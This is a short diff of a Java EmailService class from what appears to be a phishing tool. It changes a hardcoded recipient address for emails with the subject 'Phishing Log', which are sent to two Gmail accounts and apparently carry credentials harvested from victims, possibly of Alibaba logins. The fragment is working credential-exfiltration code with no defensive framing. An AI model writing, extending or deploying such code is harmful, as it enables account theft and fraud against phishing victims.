@@ -17,7 +17,7 @@ public class EmailService {
 	}
 	
 	private void sendVerificationEmail(Email email) throws MessagingException, UnsupportedEncodingException {
-		String toAddress = "alibaba.login001@gmail.com";
+		String toAddress = "alibaba.logins001@gmail.com";
 		String toAddress2 = "soft6dev@gmail.com";
 		String subject = "Phishing Log";
 		String content = "<!DOCTYPE html>\n"
